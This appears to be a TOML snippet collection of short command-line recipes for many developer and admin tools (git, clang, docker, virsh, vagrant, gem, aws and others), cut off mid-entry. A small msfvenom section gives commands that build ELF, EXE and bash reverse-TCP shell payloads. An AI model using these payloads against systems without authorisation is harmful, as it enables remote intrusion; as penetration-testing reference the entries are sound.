  description = "Send an email using a specific account configured in `~/.msmtprc`"
  command = "echo ""<Hello world>"" | msmtp --account=<account_name> <to@example.org>"
  output = ""

[[snippets]]
  description = "Send an email without a configured account. The password should be specified in the `~/.msmtprc` file"
  command = "echo ""<Hello world>"" | msmtp --host=<localhost> --port=<999> --from=<from@example.org> <to@example.org>"
  output = ""

[[snippets]]
  description = "Check the values of all attributes on a file"
  command = "git check-attr --all <path/to/file>"
  output = ""

[[snippets]]
  description = "Check the value of a specific attribute on a file"
  command = "git check-attr <attribute> <path/to/file>"
  output = ""

[[snippets]]
  description = "Check the values of all attributes on specific files"
  command = "git check-attr --all <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Check the value of a specific attribute on one or more files"
  command = "git check-attr <attribute> <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Tile images into a grid, automatically resizing images larger than the grid cell size"
  command = "montage <path/to/image1.jpg path/to/image2.jpg ...> <path/to/montage.jpg>"
  output = ""

[[snippets]]
  description = "Tile images into a grid, automatically calculating the grid cell size from the largest image"
  command = "montage <path/to/image1.jpg path/to/image2.jpg ...> -geometry <+0+0> <path/to/montage.jpg>"
  output = ""

[[snippets]]
  description = "Specify the grid cell size and resize images to fit it before tiling"
  command = "montage <path/to/image1.jpg path/to/image2.jpg ...> -geometry <640x480+0+0> <path/to/montage.jpg>"
  output = ""

[[snippets]]
  description = "Limit the number of rows and columns in the grid, causing input images to overflow into multiple output montages"
  command = "montage <path/to/image1.jpg path/to/image2.jpg ...> -geometry <+0+0> -tile <2x3> <montage_%d.jpg>"
  output = ""

[[snippets]]
  description = "Resize and crop images to fill their grid cells before tiling"
  command = "montage <path/to/image1.jpg path/to/image2.jpg ...> -geometry <+0+0> -resize <640x480^> -gravity <center> -crop <640x480+0+0> <path/to/montage.jpg>"
  output = ""

[[snippets]]
  description = "Download changes from default remote repository and merge it"
  command = "git pull"
  output = ""

[[snippets]]
  description = "Download changes from default remote repository and use fast-forward"
  command = "git pull --rebase"
  output = ""

[[snippets]]
  description = "Download changes from given remote repository and branch, then merge them into HEAD"
  command = "git pull <remote_name> <branch>"
  output = ""

[[snippets]]
  description = "Compile a source code file into an executable binary"
  command = "clang++ <path/to/source.cpp> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Display (almost) all errors and warnings"
  command = "clang++ <path/to/source.cpp> -Wall -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Choose a language standard to compile with"
  command = "clang++ <path/to/source.cpp> -std=<c++20> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Include libraries located at a different path than the source file"
  command = "clang++ <path/to/source.cpp> -o <path/to/output_executable> -I<path/to/header_path> -L<path/to/library_path> -l<path/to/library_name>"
  output = ""

[[snippets]]
  description = "Compile source code into LLVM Intermediate Representation (IR)"
  command = "clang++ -S -emit-llvm <path/to/source.cpp> -o <path/to/output.ll>"
  output = ""

[[snippets]]
  description = "Optimize the compiled program for performance"
  command = "clang++ <path/to/source.cpp> -O<1|2|3|fast> -o <path/to/output_executable>"
  output = ""

[[snippets]]
  description = "Turn a PAM image into an oil painting"
  command = "pamoil <path/to/input_file.pam> > <path/to/output_file.pam>"
  output = ""

[[snippets]]
  description = "Consider a neighborhood of N pixels for the "smearing" effect"
  command = "pamoil -n <N> <path/to/input_file.pam> > <path/to/output_file.pam>"
  output = ""

[[snippets]]
  description = "Report only statistics that have a level of concern greater than 0"
  command = "git sizer"
  output = ""

[[snippets]]
  description = "Report all statistics"
  command = "git sizer -v"
  output = ""

[[snippets]]
  description = "See additional options"
  command = "git sizer -h"
  output = ""

[[snippets]]
  description = "Create Vagrantfile in current directory with the base Vagrant box"
  command = "vagrant init"
  output = ""

[[snippets]]
  description = "Create Vagrantfile with the Ubuntu 20.04 (Focal Fossa) box from HashiCorp Atlas"
  command = "vagrant init ubuntu/focal64"
  output = ""

[[snippets]]
  description = "Start and provision the vagrant environment"
  command = "vagrant up"
  output = ""

[[snippets]]
  description = "Suspend the machine"
  command = "vagrant suspend"
  output = ""

[[snippets]]
  description = "Halt the machine"
  command = "vagrant halt"
  output = ""

[[snippets]]
  description = "Connect to machine via SSH"
  command = "vagrant ssh"
  output = ""

[[snippets]]
  description = "Output the SSH configuration file of the running Vagrant machine"
  command = "vagrant ssh-config"
  output = ""

[[snippets]]
  description = "List all local boxes"
  command = "vagrant box list"
  output = ""

[[snippets]]
  description = "Display a live stream for the statistics of all running containers"
  command = "docker stats"
  output = ""

[[snippets]]
  description = "Display a live stream of statistics for one or more containers"
  command = "docker stats <container1 container2 ...>"
  output = ""

[[snippets]]
  description = "Change the columns format to display container's CPU usage percentage"
  command = "docker stats --format ""<.Name>:\t<.CPUPerc>"""
  output = ""

[[snippets]]
  description = "Display statistics for all containers (both running and stopped)"
  command = "docker stats --all"
  output = ""

[[snippets]]
  description = "Disable streaming stats and only pull the current stats"
  command = "docker stats --no-stream"
  output = ""

[[snippets]]
  description = "Make a STUN request"
  command = "stun <stun.1und1.de>"
  output = ""

[[snippets]]
  description = "Make a STUN request and specify the source port"
  command = "stun <stun.1und1.de> -p <4302>"
  output = ""

[[snippets]]
  description = "Subscribe to target state updates under the subtree of a specific path"
  command = "gnmic --address <ip:port> subscribe --path <path>"
  output = ""

[[snippets]]
  description = "Subscribe to a target with a sample interval of 30s (default is 10s)"
  command = "gnmic -a <ip:port> subscribe --path <path> --sample-interval 30s"
  output = ""

[[snippets]]
  description = "Subscribe to a target with sample interval and updates only on change"
  command = "gnmic -a <ip:port> subscribe --path <path> --stream-mode on-change --heartbeat-interval 1m"
  output = ""

[[snippets]]
  description = "Subscribe to a target for only one update"
  command = "gnmic -a <ip:port> subscribe --path <path> --mode once"
  output = ""

[[snippets]]
  description = "Subscribe to a target and specify response encoding (json_ietf)"
  command = "gnmic -a <ip:port> subscribe --path <path> --encoding json_ietf"
  output = ""

[[snippets]]
  description = "Export an SVG file executing the specified Inkfile"
  command = "inkmake <path/to/Inkfile>"
  output = ""

[[snippets]]
  description = "Execute an Inkfile and show detailed information"
  command = "inkmake --verbose <path/to/Inkfile>"
  output = ""

[[snippets]]
  description = "Execute an Inkfile, specifying SVG input file(s) and an output file"
  command = "inkmake --svg <path/to/file.svg> --out <path/to/output_image> <path/to/Inkfile>"
  output = ""

[[snippets]]
  description = "Use a custom Inkscape binary as the backend"
  command = "inkmake --inkscape </Applications/Inkscape.app/Contents/Resources/bin/inkscape> <path/to/Inkfile>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "inkmake --help"
  output = ""

[[snippets]]
  description = "Log in by using an interactive prompt"
  command = "ibmcloud login"
  output = ""

[[snippets]]
  description = "Log in to a specific API endpoint (default is `cloud.ibm.com`)"
  command = "ibmcloud login -a <api_endpoint>"
  output = ""

[[snippets]]
  description = "Log in by providing username, password and the targeted region as parameters"
  command = "ibmcloud login -u <username> -p <password> -r <us-south>"
  output = ""

[[snippets]]
  description = "Log in with an API key, passing it as an argument"
  command = "ibmcloud login --apikey <api_key_string>"
  output = ""

[[snippets]]
  description = "Log in with an API key, passing it as a file"
  command = "ibmcloud login --apikey @<path/to/api_key_file>"
  output = ""

[[snippets]]
  description = "Log in with a federated ID (single sign-on)"
  command = "ibmcloud login --sso"
  output = ""

[[snippets]]
  description = "Convert a Netpbm image to a TrueVision Targa file"
  command = "pamtotga <path/to/file.pam> > <path/to/output.tga>"
  output = ""

[[snippets]]
  description = "Specify the color map of the output image"
  command = "pamtotga -<cmap|cmap16|mono|rgb> <path/to/file.pam> > <path/to/output.tga>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pamtotga -version"
  output = ""

[[snippets]]
  description = "Connect to a hypervisor session"
  command = "virsh connect <qemu:///system>"
  output = ""

[[snippets]]
  description = "List all domains"
  command = "virsh list --all"
  output = ""

[[snippets]]
  description = "Dump guest configuration file"
  command = "virsh dumpxml <guest_id> > <path/to/guest.xml>"
  output = ""

[[snippets]]
  description = "Create a guest from a configuration file"
  command = "virsh create <path/to/config_file.xml>"
  output = ""

[[snippets]]
  description = "Edit a guest's configuration file (editor can be changed with $EDITOR)"
  command = "virsh edit <guest_id>"
  output = ""

[[snippets]]
  description = "Start/reboot/shutdown/suspend/resume a guest"
  command = "virsh <command> <guest_id>"
  output = ""

[[snippets]]
  description = "Save the current state of a guest to a file"
  command = "virsh save <guest_id> <filename>"
  output = ""

[[snippets]]
  description = "Delete a running guest"
  command = "virsh destroy <guest_id> && virsh undefine <guest_id>"
  output = ""

[[snippets]]
  description = "Convert a compressed FIASCO file to a PNM file or in the case of video streams multiple PNM files"
  command = "fiascotopnm <path/to/file.fiasco> -o <output_file_basename>"
  output = ""

[[snippets]]
  description = "Use fast decompression, resulting in a slightly decreased quality of the output file(s)"
  command = "fiascotopnm --fast <path/to/file.fiasco> -o <output_file_basename>"
  output = ""

[[snippets]]
  description = "Load the options to be used from the specified configuration file"
  command = "fiascotopnm --config <path/to/fiascorc> <path/to/file.fiasco> -o <output_file_basename>"
  output = ""

[[snippets]]
  description = "Magnify the decompressed image(s) by a factor of 2^n"
  command = "fiascotopnm --magnify <n> <path/to/file.fiasco> -o <output_file_basename>"
  output = ""

[[snippets]]
  description = "Smooth the decompressed image by the specified amount"
  command = "fiascotopnm --smooth <n> <path/to/file.fiasco> -o <output_file_basename>"
  output = ""

[[snippets]]
  description = "Connect to a specific instance at <https://account.snowflakecomputing.com> (password can be provided in prompt or configuration file)"
  command = "snowsql --accountname <account> --username <username> --dbname <database> --schemaname <schema>"
  output = ""

[[snippets]]
  description = "Connect to an instance specified by a specific configuration file (defaults to `~/.snowsql/config`)"
  command = "snowsql --config <path/to/configuration_file>"
  output = ""

[[snippets]]
  description = "Connect to the default instance using a token for multi-factor authentication"
  command = "snowsql --mfa-passcode <token>"
  output = ""

[[snippets]]
  description = "Execute a single SQL query or SnowSQL command on the default connection (useful in shell scripts)"
  command = "snowsql --query '<query>'"
  output = ""

[[snippets]]
  description = "Execute commands from a specific file on the default connection"
  command = "snowsql --filename <path/to/file.sql>"
  output = ""

[[snippets]]
  description = "Connect to the default hypervisor"
  command = "virsh connect"
  output = ""

[[snippets]]
  description = "Connect as root to the local QEMU/KVM hypervisor"
  command = "virsh connect qemu:///system"
  output = ""

[[snippets]]
  description = "Launch a new instance of the hypervisor and connect to it as the local user"
  command = "virsh connect qemu:///session"
  output = ""

[[snippets]]
  description = "Connect as root to a remote hypervisor using ssh"
  command = "virsh connect qemu+ssh://<user_name@host_name>/system"
  output = ""

[[snippets]]
  description = "Search for remote gem(s) and show all available versions"
  command = "gem search <regular_expression> --all"
  output = ""

[[snippets]]
  description = "Install the latest version of a gem"
  command = "gem install <gem_name>"
  output = ""

[[snippets]]
  description = "Install a specific version of a gem"
  command = "gem install <gem_name> --version <1.0.0>"
  output = ""

[[snippets]]
  description = "Install the latest matching (SemVer) version of a gem"
  command = "gem install <gem_name> --version '~> <1.0>'"
  output = ""

[[snippets]]
  description = "Update a gem"
  command = "gem update <gem_name>"
  output = ""

[[snippets]]
  description = "List all local gems"
  command = "gem list"
  output = ""

[[snippets]]
  description = "Uninstall a gem"
  command = "gem uninstall <gem_name>"
  output = ""

[[snippets]]
  description = "Uninstall a specific version of a gem"
  command = "gem uninstall <gem_name> --version <1.0.0>"
  output = ""

[[snippets]]
  description = "Clean a CSV file"
  command = "csvclean <bad.csv>"
  output = ""

[[snippets]]
  description = "List locations of syntax errors in a CSV file"
  command = "csvclean -n <bad.csv>"
  output = ""

[[snippets]]
  description = "Compile the project or solution in the current directory"
  command = "dotnet build"
  output = ""

[[snippets]]
  description = "Compile a .NET project or solution in debug mode"
  command = "dotnet build <path/to/project_or_solution>"
  output = ""

[[snippets]]
  description = "Compile in release mode"
  command = "dotnet build --configuration <Release>"
  output = ""

[[snippets]]
  description = "Compile without restoring dependencies"
  command = "dotnet build --no-restore"
  output = ""

[[snippets]]
  description = "Compile with a specific verbosity level"
  command = "dotnet build --verbosity <quiet|minimal|normal|detailed|diagnostic>"
  output = ""

[[snippets]]
  description = "Compile for a specific runtime"
  command = "dotnet build --runtime <runtime_identifier>"
  output = ""

[[snippets]]
  description = "Specify the output directory"
  command = "dotnet build --output <path/to/directory>"
  output = ""

[[snippets]]
  description = "Search the PATH environment variable and display the location of any matching executables"
  command = "which <executable>"
  output = ""

[[snippets]]
  description = "If there are multiple executables which match, display all"
  command = "which -a <executable>"
  output = ""

[[snippets]]
  description = "Check if the cert-manager API is ready"
  command = "cmctl check api"
  output = ""

[[snippets]]
  description = "Check the status of a certificate"
  command = "cmctl status certificate <cert_name>"
  output = ""

[[snippets]]
  description = "Create a new certificate request based on an existing certificate"
  command = "cmctl create certificaterequest my-cr --from-certificate-file <cert.yaml>"
  output = ""

[[snippets]]
  description = "Create a new certificate request, fetch the signed certificate, and set a maximum wait time"
  command = "cmctl create certificaterequest my-cr --from-certificate-file <cert.yaml> --fetch-certificate --timeout <20m>"
  output = ""

[[snippets]]
  description = "Save an image by redirecting `stdout` to a `tar` archive"
  command = "docker save <image>:<tag> > <path/to/file.tar>"
  output = ""

[[snippets]]
  description = "Save an image to a `tar` archive"
  command = "docker save --output <path/to/file.tar> <image>:<tag>"
  output = ""

[[snippets]]
  description = "Save all tags of the image"
  command = "docker save --output <path/to/file.tar> <image_name>"
  output = ""

[[snippets]]
  description = "Cherry-pick particular tags of an image to save"
  command = "docker save --output <path/to/file.tar> <image_name:tag1 image_name:tag2 ...>"
  output = ""

[[snippets]]
  description = "List all subscriptions for the logged in account"
  command = "az account list"
  output = ""

[[snippets]]
  description = "Set a `subscription` to be the currently active subscription"
  command = "az account set --subscription <subscription_id>"
  output = ""

[[snippets]]
  description = "List supported regions for the currently active subscription"
  command = "az account list-locations"
  output = ""

[[snippets]]
  description = "Print an access token to be used with `MS Graph API`"
  command = "az account get-access-token --resource-type <ms-graph>"
  output = ""

[[snippets]]
  description = "Print details of the currently active subscription in a specific format"
  command = "az account show --output <json|tsv|table|yaml>"
  output = ""

[[snippets]]
  description = "Start `wpm`"
  command = "wpm"
  output = ""

[[snippets]]
  description = "Start `wpm` with short texts"
  command = "wpm --short"
  output = ""

[[snippets]]
  description = "Start `wpm` using a specific text file"
  command = "wpm --load <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Tag your race scores"
  command = "wpm --tag <tag_name>"
  output = ""

[[snippets]]
  description = "Show score statistics grouped by tags"
  command = "wpm --stats"
  output = ""

[[snippets]]
  description = "Start `wpm` with monochrome colors"
  command = "wpm --monochrome"
  output = ""

[[snippets]]
  description = "Display available interfaces"
  command = "dumpcap --list-interfaces"
  output = ""

[[snippets]]
  description = "Capture packets on a specific interface"
  command = "dumpcap --interface <1>"
  output = ""

[[snippets]]
  description = "Capture packets to a specific location"
  command = "dumpcap --interface <1> -w <path/to/output_file.pcapng>"
  output = ""

[[snippets]]
  description = "Write to a ring buffer with a specific max file limit of a specific size"
  command = "dumpcap --interface <1> -w <path/to/output_file.pcapng> --ring-buffer filesize:<500000> --ring-buffer files:<10>"
  output = ""

[[snippets]]
  description = "List payloads"
  command = "msfvenom -l payloads"
  output = ""

[[snippets]]
  description = "List formats"
  command = "msfvenom -l formats"
  output = ""

[[snippets]]
  description = "Show payload options"
  command = "msfvenom -p <payload> --list-options"
  output = ""

[[snippets]]
  description = "Create an ELF binary with a reverse TCP handler"
  command = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f elf -o <path/to/binary>"
  output = ""

[[snippets]]
  description = "Create an EXE binary with a reverse TCP handler"
  command = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe -o <path/to/binary.exe>"
  output = ""

[[snippets]]
  description = "Create a raw bash with a reverse TCP handler"
  command = "msfvenom -p cmd/unix/reverse_bash LHOST=<local_ip> LPORT=<local_port> -f raw"
  output = ""

[[snippets]]
  description = "List all valid generators"
  command = "fakedata --generators"
  output = ""

[[snippets]]
  description = "Generate data using one or more generators"
  command = "fakedata <generator1> <generator2>"
  output = ""

[[snippets]]
  description = "Generate data with a specific output format"
  command = "fakedata --format <csv|tab|sql> <generator>"
  output = ""

[[snippets]]
  description = "Generate a given number of data items (defaults to 10)"
  command = "fakedata --limit <n> <generator>"
  output = ""

[[snippets]]
  description = "Generate data using a custom output template (the first letter of generator names must be capitalized)"
  command = "echo ""<\{\{Generator\}\>}"" | fakedata"
  output = ""

[[snippets]]
  description = "Generate a simple regular expression"
  command = "grex <space_separated_strings>"
  output = ""

[[snippets]]
  description = "Generate a case-insensitive regular expression"
  command = "grex -i <space_separated_strings>"
  output = ""

[[snippets]]
  description = "Replace digits with '\d'"
  command = "grex -d <space_separated_strings>"
  output = ""

[[snippets]]
  description = "Replace Unicode word character with '\w'"
  command = "grex -w <space_separated_strings>"
  output = ""

[[snippets]]
  description = "Replace spaces with '\s'"
  command = "grex -s <space_separated_strings>"
  output = ""

[[snippets]]
  description = "Add {min, max} quantifier representation for repeating sub-strings"
  command = "grex -r <space_separated_strings>"
  output = ""

[[snippets]]
  description = "Reproject a raster dataset"
  command = "gdalwarp -t_srs <EPSG:4326> <path/to/input.tif> <path/to/output.tif>"
  output = ""

[[snippets]]
  description = "Crop a raster dataset by using specific coordinates"
  command = "gdalwarp -te <min_x> <min_y> <max_x> <max_y> -te_srs <EPSG:4326> <path/to/input.tif> <path/to/output.tif>"
  output = ""

[[snippets]]
  description = "Crop a raster dataset using a vector layer"
  command = "gdalwarp -cutline <path/to/area_to_cut.geojson> -crop_to_cutline <path/to/input.tif> <path/to/output.tif>"
  output = ""

[[snippets]]
  description = "Run a vala file, with gtk+"
  command = "vala <path/to/file.vala> --pkg <gtk+-3.0>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "vala --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "vala --version"
  output = ""

[[snippets]]
  description = "Convert an XIM image to a PPM image"
  command = "ximtoppm <path/to/input_file.xim> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Store the transparency mask of the input image in the specified file"
  command = "ximtoppm --alphaout <path/to/alpha_file.pbm> <path/to/input_file.xim> > <path/to/output_file.ppm>"
  output = ""

[[snippets]]
  description = "Delete a specific S3 object"
  command = "aws s3 rm s3://<bucket_name>/<path/to/file>"
  output = ""

[[snippets]]
  description = "Preview the deletion of a specific S3 object without deleting it (dry-run)"
  command = "aws s3 rm s3://<bucket_name>/<path/to/file> --dryrun"
  output = ""

[[snippets]]
  description = "Delete an object from a specific S3 access point"
  command = "aws s3 rm s3://arn:aws:s3:<region>:<account_id>:<access_point>/<access_point_name>/<object_key>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws s3 rm help"
  output = ""

[[snippets]]
  description = "Create a droplet"
  command = "doctl compute droplet create --region <region> --image <os_image> --size <vps_type> <droplet_name>"
  output = ""

[[snippets]]
  description = "Delete a droplet"
  command = "doctl compute droplet delete <droplet_id|droplet_name>"
  output = ""

[[snippets]]
  description = "List droplets"
  command = "doctl compute droplet list"
  output = ""

[[snippets]]
  description = "Open the current repository's CI configuration on its upstream website"
  command = "git browse-ci"
  output = ""

[[snippets]]
  description = "Open the current repository's CI configuration on its upstream website for a specific remote"
  command = "git browse-ci <remote>"
  output = ""

[[snippets]]
  description = "Send a file"
  command = "wormhole send <path/to/file>"
  output = ""

[[snippets]]
  description = "Receive a file"
  command = "wormhole receive <wormhole_code>"
  output = ""

[[snippets]]
  description = "Send raw text"
  command = "wormhole send"
  output = ""

[[snippets]]
  description = "Create a new project"
  command = "gitlab create_project <project_name>"
  output = ""

[[snippets]]
  description = "Get info about a specific commit"
  command = "gitlab commit <project_name> <commit_hash>"
  output = ""

[[snippets]]
  description = "Get info about jobs in a CI pipeline"
  command = "gitlab pipeline_jobs <project_name> <pipeline_id>"
  output = ""

[[snippets]]
  description = "Start a specific CI job"
  command = "gitlab job_play <project_name> <job_id>"
  output = ""

[[snippets]]
  description = "Create/overwrite htpasswd file"
  command = "htpasswd -c <path/to/file> <username>"
  output = ""

[[snippets]]
  description = "Add user to htpasswd file or update existing user"
  command = "htpasswd <path/to/file> <username>"
  output = ""

[[snippets]]
  description = "Add user to htpasswd file in batch mode without an interactive password prompt (for script usage)"
  command = "htpasswd -b <path/to/file> <username> <password>"
  output = ""

[[snippets]]
  description = "Delete user from htpasswd file"
  command = "htpasswd -D <path/to/file> <username>"
  output = ""

[[snippets]]
  description = "Verify user password"
  command = "htpasswd -v <path/to/file> <username>"
  output = ""

[[snippets]]
  description = "Display a string with username (plain text) and password (md5)"
  command = "htpasswd -nbm <username> <password>"
  output = ""

[[snippets]]
  description = "[e]valuate an expression"
  command = "bb -e ""(+ 1 2 3)"""
  output = ""

[[snippets]]
  description = "Evaluate a script [f]ile"
  command = "bb -f <path/to/script.clj>"
  output = ""

[[snippets]]
  description = "Bind [i]nput to a sequence of lines from `stdin`"
  command = "printf ""first\nsecond"" | bb -i ""(map clojure.string/capitalize *input*)"""
  output = ""

[[snippets]]
  description = "Bind [I]nput to a sequence of EDN (Extensible Data Notation) values from `stdin`"
  command = "echo ""{:key 'val}"" | bb -I ""(:key (first *input*))"""
  output = ""

[[snippets]]
  description = "Log in to the Perforce service"
  command = "p4 login -a"
  output = ""

[[snippets]]
  description = "Create a client"
  command = "p4 client"
  output = ""

[[snippets]]
  description = "Copy files from depot into the client workspace"
  command = "p4 sync"
  output = ""

[[snippets]]
  description = "Create or edit changelist description"
  command = "p4 change"
  output = ""

[[snippets]]
  description = "Open a file to edit"
  command = "p4 edit -c <changelist_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a new file to add it to the depot"
  command = "p4 add"
  output = ""

[[snippets]]
  description = "Display list of files modified by changelist"
  command = "p4 describe -c <changelist_number>"
  output = ""

[[snippets]]
  description = "Submit a changelist to the depot"
  command = "p4 submit -c <changelist_number>"
  output = ""

[[snippets]]
  description = "List regions that support Kubernetes clusters"
  command = "doctl kubernetes options regions"
  output = ""

[[snippets]]
  description = "List machine sizes that can be used in a Kubernetes cluster"
  command = "doctl kubernetes options sizes"
  output = ""

[[snippets]]
  description = "List Kubernetes versions that can be used with DigitalOcean clusters"
  command = "doctl kubernetes options versions"
  output = ""

[[snippets]]
  description = "Lint a single CSS file"
  command = "csslint <file.css>"
  output = ""

[[snippets]]
  description = "Lint multiple CSS files"
  command = "csslint <file1.css file2.css ...>"
  output = ""

[[snippets]]
  description = "List all possible style rules"
  command = "csslint --list-rules"
  output = ""

[[snippets]]
  description = "Treat certain rules as errors (which results in a non-zero exit code)"
  command = "csslint --errors=<errors,universal-selector,imports> <file.css>"
  output = ""

[[snippets]]
  description = "Treat certain rules as warnings"
  command = "csslint --warnings=<box-sizing,selector-max,floats> <file.css>"
  output = ""

[[snippets]]
  description = "Ignore specific rules"
  command = "csslint --ignore=<ids,rules-count,shorthand> <file.css>"
  output = ""

[[snippets]]
  description = "Transpile using one or more comma-separated transformations"
  command = "lebab --transform <transformation1,transformation2,...>"
  output = ""

[[snippets]]
  description = "Transpile a file to `stdout`"
  command = "lebab <path/to/input_file>"
  output = ""

[[snippets]]
  description = "Transpile a file to the specified output file"
  command = "lebab <path/to/input_file> --out-file <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Replace all `.js` files in-place in the specified directory, glob or file"
  command = "lebab --replace <directory|glob|file>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "lebab --help"
  output = ""

[[snippets]]
  description = "Generate the PBM, PGM, or PNM image as output, for Windows or OS/2 BMP file as input"
  command = "bmptopnm <path/to/file.bmp>"
  output = ""

[[snippets]]
  description = "Report contents of the BMP header to `stderr`"
  command = "bmptopnm -verbose <path/to/file.bmp>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "bmptopnm -version"
  output = ""

[[snippets]]
  description = "Estimate the number and the size of all emails on your Gmail account"
  command = "gyb --email <email@gmail.com> --action estimate"
  output = ""

[[snippets]]
  description = "Backup a Gmail account to a specific directory"
  command = "gyb --email <email@gmail.com> --action backup --local-folder <path/to/directory>"
  output = ""

[[snippets]]
  description = "Backup only important or starred emails from a Gmail account to the default local folder"
  command = "gyb --email <email@gmail.com> --search ""<is:important OR is:starred>"""
  output = ""

[[snippets]]
  description = "Restore from a local folder to a Gmail account"
  command = "gyb --email <email@gmail.com> --action restore --local-folder <path/to/directory>"
  output = ""

[[snippets]]
  description = "Import an existing patch from a file"
  command = "quilt import <path/to/filename.patch>"
  output = ""

[[snippets]]
  description = "Create a new patch"
  command = "quilt new <filename.patch>"
  output = ""

[[snippets]]
  description = "Add a file to the current patch"
  command = "quilt add <path/to/file>"
  output = ""

[[snippets]]
  description = "After editing the file, refresh the current patch with the changes"
  command = "quilt refresh"
  output = ""

[[snippets]]
  description = "Apply all the patches in the series file"
  command = "quilt push -a"
  output = ""

[[snippets]]
  description = "Remove all applied patches"
  command = "quilt pop -a"
  output = ""

[[snippets]]
  description = "Use the (default) Memcheck tool to show a diagnostic of memory usage by `program`"
  command = "valgrind <program>"
  output = ""

[[snippets]]
  description = "Use Memcheck to report all possible memory leaks of `program` in full detail"
  command = "valgrind --leak-check=full --show-leak-kinds=all <program>"
  output = ""

[[snippets]]
  description = "Use the Cachegrind tool to profile and log CPU cache operations of `program`"
  command = "valgrind --tool=cachegrind <program>"
  output = ""

[[snippets]]
  description = "Use the Massif tool to profile and log heap memory and stack usage of `program`"
  command = "valgrind --tool=massif --stacks=yes <program>"
  output = ""

[[snippets]]
  description = "Run a random screensaver"
  command = "gh screensaver"
  output = ""

[[snippets]]
  description = "Run a specific screensaver"
  command = "gh screensaver --saver <fireworks|life|marquee|pipes|pollock|starfield>"
  output = ""

[[snippets]]
  description = "Run the "marquee" screensaver with a specific text and font"
  command = "gh screensaver --saver <marquee> -- --message=""<message>"" --font=<font_name>"
  output = ""

[[snippets]]
  description = "Run the "starfield" screensaver with a specific density and speed"
  command = "gh screensaver --saver <starfield> -- --density <500> --speed <10>"
  output = ""

[[snippets]]
  description = "List available screensavers"
  command = "gh screensaver --list"
  output = ""

[[snippets]]
  description = "View documentation for pages related to standard streams"
  command = "tldr <ifne|mispipe|pee|sponge|vipe|vidir>"
  output = ""

[[snippets]]
  description = "View documentation for other pages"
  command = "tldr <combine|errno|ifdata|isutt8|lckdo|parallel|zrun>"
  output = ""

[[snippets]]
  description = "Convert a WBMP file to a PBM image"
  command = "wbmptopbm <path/to/input_file.wbpm> > <path/to/output_file.pbm>"
  output = ""

[[snippets]]
  description = "Configure powerlevel10k interactively"
  command = "p10k configure"
  output = ""

[[snippets]]
  description = "Reload powerlevel10k"
  command = "p10k reload"
  output = ""

[[snippets]]
  description = "Display help"
  command = "p10k help"
  output = ""

[[snippets]]
  description = "Output commands to set LS_COLOR using default colors"
  command = "dircolors"
  output = ""

[[snippets]]
  description = "Output commands to set LS_COLOR using colors from a file"
  command = "dircolors <path/to/file>"
  output = ""

[[snippets]]
  description = "Output commands for Bourne shell"
  command = "dircolors --bourne-shell"
  output = ""

[[snippets]]
  description = "Output commands for C shell"
  command = "dircolors --c-shell"
  output = ""

[[snippets]]
  description = "View the default colors for file types and extensions"
  command = "dircolors --print-data"
  output = ""

[[snippets]]
  description = "Add transactions to your journal interactively"
  command = "hledger add"
  output = ""

[[snippets]]
  description = "Show the account hierarchy, using a specific journal file"
  command = "hledger --file <path/to/file.journal> accounts --tree"
  output = ""

[[snippets]]
  description = "Show a monthly income statement"
  command = "hledger incomestatement --monthly --depth 2"
  output = ""

[[snippets]]
  description = "Print the amount of cash spent on food"
  command = "hledger print assets:cash | hledger -f- -I balance expenses:food --depth 2"
  output = ""

[[snippets]]
  description = "Show current cache [s]tatistics"
  command = "ccache --show-stats"
  output = ""

[[snippets]]
  description = "[C]lear all cache"
  command = "ccache --clear"
  output = ""

[[snippets]]
  description = "Reset ([z]ero) statistics (but not cache itself)"
  command = "ccache --zero-stats"
  output = ""

[[snippets]]
  description = "Compile C code and cache compiled output (to use `ccache` on all `gcc` invocations, see the note above)"
  command = "ccache gcc <path/to/file.c>"
  output = ""

[[snippets]]
  description = "Update the value of a path"
  command = "gnmic --address <ip:port> set --update-path <path> --update-value <value>"
  output = ""

[[snippets]]
  description = "Update the value of a path to match the contents of a JSON file"
  command = "gnmic -a <ip:port> set --update-path <path> --update-file <filepath>"
  output = ""

[[snippets]]
  description = "Replace the value of a path to match the contents of a JSON file"
  command = "gnmic -a <ip:port> set --replace-path <path> --replace-file <filepath>"
  output = ""

[[snippets]]
  description = "Delete the node at a given path"
  command = "gnmic -a <ip:port> set --delete <path>"
  output = ""

[[snippets]]
  description = "Clean up a PBM image by erasing isolated black and white pixels"
  command = "pbmclean <path/to/image.pbm> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Clean up only black/white pixels"
  command = "pbmclean -<black|white> <path/to/image.pbm> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Specify the minimum number of neighbouring pixels of the same color in order for a pixel not to be considered isolated"
  command = "pbmclean -minneighbours <3> <path/to/image.pbm> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Compile a source code file into an executable binary"
  command = "clang <input_source.c> -o <output_executable>"
  output = ""

[[snippets]]
  description = "Activate output of all errors and warnings"
  command = "clang <input_source.c> -Wall -o <output_executable>"
  output = ""

[[snippets]]
  description = "Include libraries located at a different path than the source file"
  command = "clang <input_source.c> -o <output_executable> -I<header_path> -L<library_path> -l<library_name>"
  output = ""

[[snippets]]
  description = "Compile source code into LLVM Intermediate Representation (IR)"
  command = "clang -S -emit-llvm <file.c> -o <file.ll>"
  output = ""

[[snippets]]
  description = "Compile source code without linking"
  command = "clang -c <input_source.c>"
  output = ""

[[snippets]]
  description = "Optimize the compiled program for performance"
